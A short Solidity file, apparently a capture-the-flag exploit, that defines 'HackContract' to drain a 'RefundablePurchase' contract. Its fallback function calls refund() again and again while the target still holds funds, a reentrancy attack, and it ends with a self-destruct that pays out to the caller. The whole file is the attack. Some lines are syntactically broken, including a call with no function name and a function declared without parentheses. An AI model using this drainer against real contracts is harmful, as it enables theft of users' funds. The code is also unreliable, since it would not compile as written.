pragma solidity ^0.4.24;

import "./challenge2.sol";

contract HackContract {

    RefundablePurchase public refundablePurchase;

    constructor (address _refundablePurchase) payable {
        refundablePurchase = RefundablePurchase(_refundablePurchase);
    }

    function start () {
        refundablePurchase.().value(msg.value);
        refundablePurchase.refund();
    }

    function pay payable {

    }

    function kill () {
        suicide(msg.sender);
    }

    function () payable {
    if (refundablePurchase.balance >= msg.value) {
        refundablePurchase.refund();
    }
  }
}